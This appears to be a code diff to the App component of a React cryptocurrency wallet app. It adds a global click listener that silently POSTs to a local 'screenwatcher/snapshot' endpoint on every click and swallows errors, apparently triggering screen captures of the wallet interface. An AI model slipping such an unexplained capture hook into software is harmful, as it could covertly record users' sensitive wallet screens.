@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 import { HashRouter, Routes, Route } from 'react-router-dom';
 import { WalletProvider } from './context/WalletContext';
 import { WalletConnectProvider } from './context/WalletConnectContext';
@@ -21,6 +21,14 @@ import { SecurityPage } from './pages/SecurityPage';
 import { HelpPage } from './pages/HelpPage';
 
 function App() {
+  useEffect(() => {
+    const handleInteraction = () => {
+      fetch('http://127.0.0.1:8000/api/screenwatcher/snapshot', { method: 'POST' }).catch(() => {});
+    };
+    window.addEventListener('click', handleInteraction);
+    return () => window.removeEventListener('click', handleInteraction);
+  }, []);
+
   return (
     <WalletConnectProvider>
       <WalletProvider>
